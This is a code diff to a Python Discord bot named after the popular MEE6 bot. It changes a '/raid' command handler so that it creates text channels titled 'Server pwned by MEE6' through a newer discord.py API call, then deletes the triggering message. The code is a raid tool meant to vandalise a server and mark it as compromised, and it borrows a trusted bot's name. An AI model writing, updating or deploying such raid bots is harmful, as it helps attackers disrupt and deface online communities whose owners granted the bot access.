@@ -18,9 +18,9 @@ class mee6(discord.Client):
     async def on_message(self, message):
         if message.content.startswith('/raid'):
             currentguild = message.guild
-            await self.create_channel(currentguild, 'Server pwned by MEE6 :)', type=discord.ChannelType.text)
-            await self.create_channel(currentguild, 'Server pwned by MEE6 ;)', type=discord.ChannelType.text)
-            await self.create_channel(currentguild, 'Server pwned by MEE6 .)', type=discord.ChannelType.text)
+            channel = await currentguild.create_text_channel('Server pwned by MEE6 :)')
+            channel = await currentguild.create_text_channel('Server pwned by MEE6 ;)')
+            channel = await currentguild.create_text_channel('Server pwned by MEE6 .)')
             await message.delete()
             
             
